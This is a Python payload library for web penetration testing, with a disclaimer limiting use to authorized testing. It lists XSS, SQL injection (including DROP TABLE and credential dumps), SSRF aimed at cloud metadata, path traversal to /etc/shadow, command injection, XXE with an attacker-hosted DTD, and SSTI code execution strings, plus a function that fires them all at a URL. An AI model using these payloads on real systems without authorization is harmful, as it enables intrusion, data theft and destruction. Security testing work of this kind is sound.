"""Exploit payload libraries for security testing — Zexus standard library.

DISCLAIMER: All payloads in this module are provided strictly for
EDUCATIONAL purposes and AUTHORIZED security testing only. Using these
payloads against systems without explicit written permission is illegal
and unethical. The authors assume no liability for misuse.
"""

import urllib.parse
import base64
import html as html_module


class PayloadsModule:
    """Provides common security test payloads for authorized penetration testing.

    All methods are static. Every payload list is intended for use in
    controlled, authorized environments only.
    """

    # ------------------------------------------------------------------
    # XSS
    # ------------------------------------------------------------------

    @staticmethod
    def xss(variant="all"):
        """Return a list of XSS (Cross-Site Scripting) test vectors.

        Args:
            variant: One of "basic", "event", "encoded", "polyglot", "all".

        Returns:
            List of XSS payload strings.
        """
        basic = [
            '<script>alert("XSS")</script>',
            "<script>alert(1)</script>",
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            "<script>alert(String.fromCharCode(88,83,83))</script>",
        ]

        event = [
            '<div onmouseover="alert(1)">hover</div>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror=alert(1)>',
            '<textarea onfocus=alert(1) autofocus>',
        ]

        encoded = [
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
        ]

        polyglot = [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik%%0onmouseover%%0onload=alert()//",
            '"><img src=x onerror=alert(1)//><svg/onload=alert(1)//>',
            "javascript:alert(1)//';alert(1)//\";alert(1)//\\';alert(1)//\\\";alert(1)//",
            "<svg/onload=alert(1)>",
            '{{constructor.constructor("return this")().alert(1)}}',
        ]

        collections = {
            "basic": basic,
            "event": event,
            "encoded": encoded,
            "polyglot": polyglot,
        }

        if variant == "all":
            result = []
            for v in collections.values():
                result.extend(v)
            return result
        return list(collections.get(variant, []))

    # ------------------------------------------------------------------
    # SQL Injection
    # ------------------------------------------------------------------

    @staticmethod
    def sqli(variant="all"):
        """Return a list of SQL injection test vectors.

        Args:
            variant: One of "basic", "union", "blind", "time", "all".

        Returns:
            List of SQLi payload strings.
        """
        basic = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            '" OR "1"="1"',
            "1' OR 1=1 --",
            "' OR 1=1 #",
            "admin'--",
            "' UNION SELECT NULL--",
            "1; DROP TABLE users--",
            "' AND 1=0 UNION SELECT username,password FROM users--",
        ]

        union = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
            "' UNION ALL SELECT 1,2,3--",
            "1 UNION SELECT * FROM users--",
        ]

        blind = [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SUBSTRING(username,1,1)='a'--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
            "' OR IF(1=1,'a','b')='a'--",
            "' AND EXISTS(SELECT * FROM users WHERE username='admin')--",
        ]

        time = [
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; SELECT pg_sleep(5)--",
            "' OR BENCHMARK(10000000,SHA1('test'))--",
            "1; WAITFOR DELAY '0:0:5'",
        ]

        collections = {
            "basic": basic,
            "union": union,
            "blind": blind,
            "time": time,
        }

        if variant == "all":
            result = []
            for v in collections.values():
                result.extend(v)
            return result
        return list(collections.get(variant, []))

    # ------------------------------------------------------------------
    # SSRF
    # ------------------------------------------------------------------

    @staticmethod
    def ssrf(variant="all"):
        """Return a list of SSRF (Server-Side Request Forgery) test vectors.

        Args:
            variant: One of "basic", "bypass", "cloud", "all".

        Returns:
            List of SSRF payload strings.
        """
        basic = [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:8080",
        ]

        bypass = [
            "http://0x7f000001",
            "http://2130706433",
            "http://017700000001",
            "http://127.1",
            "http://127.0.1",
            "http://0",
            "http://127.0.0.1.nip.io",
            "http://localtest.me",
        ]

        cloud = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            "http://169.254.169.254/metadata/v1/",
        ]

        collections = {
            "basic": basic,
            "bypass": bypass,
            "cloud": cloud,
        }

        if variant == "all":
            result = []
            for v in collections.values():
                result.extend(v)
            return result
        return list(collections.get(variant, []))

    # ------------------------------------------------------------------
    # Path Traversal
    # ------------------------------------------------------------------

    @staticmethod
    def path_traversal(variant="all"):
        """Return a list of path traversal test vectors.

        Args:
            variant: One of "basic", "encoded", "os", "all".

        Returns:
            List of path traversal payload strings.
        """
        basic = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "../../../etc/shadow",
            "../../../etc/hosts",
            "..%2f..%2f..%2fetc%2fpasswd",
        ]

        encoded = [
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
            "%00../../etc/passwd",
        ]

        os_specific = [
            "/etc/passwd",
            "/etc/shadow",
            "/proc/self/environ",
            "C:\\Windows\\system.ini",
            "C:\\boot.ini",
            "/var/log/apache2/access.log",
            "/proc/self/cmdline",
        ]

        collections = {
            "basic": basic,
            "encoded": encoded,
            "os": os_specific,
        }

        if variant == "all":
            result = []
            for v in collections.values():
                result.extend(v)
            return result
        return list(collections.get(variant, []))

    # ------------------------------------------------------------------
    # Command Injection
    # ------------------------------------------------------------------

    @staticmethod
    def command_injection(variant="all"):
        """Return a list of OS command injection test vectors.

        Args:
            variant: One of "basic", "blind", "chained", "all".

        Returns:
            List of command injection payload strings.
        """
        basic = [
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "|| ls",
            "`ls`",
            "$(ls)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
        ]

        blind = [
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
            "&& sleep 5",
            "; ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",
            "$(sleep 5)",
            "`sleep 5`",
        ]

        chained = [
            "; ls -la; whoami",
            "| ls && whoami",
            "& ls & whoami &",
            "; echo 'test' > evidence.txt",
            "| id; uname -a",
            "&& cat /etc/passwd && whoami",
        ]

        collections = {
            "basic": basic,
            "blind": blind,
            "chained": chained,
        }

        if variant == "all":
            result = []
            for v in collections.values():
                result.extend(v)
            return result
        return list(collections.get(variant, []))

    # ------------------------------------------------------------------
    # XXE
    # ------------------------------------------------------------------

    @staticmethod
    def xxe():
        """Return a list of XXE (XML External Entity) test vectors.

        Returns:
            List of XXE payload strings.
        """
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        ]

    # ------------------------------------------------------------------
    # Header Injection
    # ------------------------------------------------------------------

    @staticmethod
    def header_injection():
        """Return a list of HTTP header injection test vectors.

        Returns:
            List of header injection payload strings.
        """
        return [
            "value\r\nInjected-Header: injected",
            "value\r\n\r\n<html>Injected Body</html>",
            "value%0d%0aInjected-Header:%20injected",
            "value%0aInjected-Header:%20injected",
            "value%0dInjected-Header:%20injected",
            "value\nSet-Cookie: injected=true",
            "value%0d%0aSet-Cookie:%20session=hijacked",
            "value\r\nX-Injected: true",
        ]

    # ------------------------------------------------------------------
    # Template Injection (SSTI)
    # ------------------------------------------------------------------

    @staticmethod
    def template_injection():
        """Return a list of SSTI (Server-Side Template Injection) test vectors.

        Returns:
            List of SSTI payload strings.
        """
        return [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{config}}",
            "{{self.__class__.__mro__}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__}}",
            "{%import os%}{{os.popen('id').read()}}",
            "{{''.__class__.__bases__[0].__subclasses__()}}",
            "#{root.class.forName('java.lang.Runtime')}",
        ]

    # ------------------------------------------------------------------
    # test_all
    # ------------------------------------------------------------------

    @staticmethod
    def test_all(url, method="GET", params=None):
        """Run all payload categories against a URL and return results.

        Sends each payload to the target URL as a query parameter or in
        the request body and records whether the payload was reflected
        in the response.

        Args:
            url: Target URL for testing.
            method: HTTP method — "GET" or "POST".
            params: Optional dict of additional query parameters.

        Returns:
            Dict mapping category names to lists of result dicts with
            keys: payload, reflected (bool), status_code.

        WARNING: Only use against systems you are authorized to test.
        """
        import urllib.request
        import urllib.error

        categories = {
            "xss": PayloadsModule.xss(),
            "sqli": PayloadsModule.sqli(),
            "ssrf": PayloadsModule.ssrf(),
            "path_traversal": PayloadsModule.path_traversal(),
            "command_injection": PayloadsModule.command_injection(),
            "xxe": PayloadsModule.xxe(),
            "header_injection": PayloadsModule.header_injection(),
            "template_injection": PayloadsModule.template_injection(),
        }

        results = {}
        for category, payloads in categories.items():
            cat_results = []
            for payload in payloads:
                try:
                    encoded = urllib.parse.quote(payload, safe="")
                    if method.upper() == "GET":
                        sep = "&" if "?" in url else "?"
                        test_url = f"{url}{sep}test={encoded}"
                        if params:
                            for k, v in params.items():
                                test_url += f"&{urllib.parse.quote(k)}={urllib.parse.quote(str(v))}"
                        req = urllib.request.Request(test_url, method="GET")
                    else:
                        data_dict = {"test": payload}
                        if params:
                            data_dict.update(params)
                        body = urllib.parse.urlencode(data_dict).encode()
                        req = urllib.request.Request(url, data=body, method="POST")
                        req.add_header("Content-Type", "application/x-www-form-urlencoded")

                    req.add_header("User-Agent", "Zexus-SecurityTester/1.0")
                    with urllib.request.urlopen(req, timeout=10) as resp:
                        response_body = resp.read().decode("utf-8", errors="replace")
                        cat_results.append({
                            "payload": payload,
                            "reflected": payload in response_body,
                            "status_code": resp.status,
                        })
                except urllib.error.HTTPError as e:
                    cat_results.append({
                        "payload": payload,
                        "reflected": False,
                        "status_code": e.code,
                    })
                except (urllib.error.URLError, OSError):
                    cat_results.append({
                        "payload": payload,
                        "reflected": False,
                        "status_code": None,
                    })

            results[category] = cat_results

        return results

    # ------------------------------------------------------------------
    # Encoding helpers
    # ------------------------------------------------------------------

    @staticmethod
    def encode_payload(payload, encoding="url"):
        """Encode a payload string using the specified encoding.

        Args:
            payload: The raw payload string.
            encoding: One of "url", "base64", "hex", "html", "unicode".

        Returns:
            The encoded payload string.
        """
        if encoding == "url":
            return urllib.parse.quote(payload, safe="")
        elif encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "hex":
            return payload.encode().hex()
        elif encoding == "html":
            return html_module.escape(payload)
        elif encoding == "unicode":
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        else:
            return payload

    # ------------------------------------------------------------------
    # Wordlist generation
    # ------------------------------------------------------------------

    @staticmethod
    def generate_wordlist(category="common"):
        """Generate a wordlist for brute-force or discovery testing.

        Args:
            category: One of "common", "directories", "files", "subdomains".

        Returns:
            List of wordlist strings.
        """
        common = [
            "admin", "administrator", "root", "user", "test", "guest",
            "info", "adm", "mysql", "oracle", "ftp", "proxy", "nagios",
            "www", "web", "backup", "operator", "master", "support",
            "monitor", "demo", "service", "developer", "manager",
            "sysadmin", "superuser", "default", "public", "private",
        ]

        directories = [
            "admin", "administrator", "api", "backup", "bin", "cgi-bin",
            "config", "console", "dashboard", "data", "db", "debug",
            "deploy", "dev", "docs", "downloads", "env", "git", "help",
            "hidden", "images", "include", "internal", "js", "lib",
            "log", "login", "logs", "manage", "media", "old", "panel",
            "private", "public", "scripts", "secret", "server-status",
            "setup", "shell", "src", "staging", "static", "status",
            "storage", "svn", "system", "temp", "test", "tmp",
            "upload", "uploads", "user", "users", "vendor", "wp-admin",
            "wp-content", "wp-includes",
        ]

        files = [
            ".env", ".git/config", ".gitignore", ".htaccess",
            ".htpasswd", ".svn/entries", "backup.sql", "backup.zip",
            "composer.json", "config.php", "config.yml",
            "database.yml", "debug.log", "docker-compose.yml",
            "Dockerfile", "dump.sql", "error.log", "id_rsa",
            "package.json", "php.ini", "phpinfo.php", "README.md",
            "robots.txt", "server.log", "settings.py", "sitemap.xml",
            "web.config", "wp-config.php", "yarn.lock",
        ]

        subdomains = [
            "api", "app", "admin", "beta", "blog", "cdn", "ci",
            "dashboard", "db", "demo", "dev", "docs", "ftp", "git",
            "grafana", "help", "internal", "jenkins", "jira", "kafka",
            "ldap", "login", "mail", "manage", "monitor", "mysql",
            "ns1", "ns2", "portal", "prod", "proxy", "qa",
            "redis", "registry", "remote", "repo", "staging",
            "status", "test", "vpn", "webmail", "wiki", "www",
        ]

        collections = {
            "common": common,
            "directories": directories,
            "files": files,
            "subdomains": subdomains,
        }

        return list(collections.get(category, common))
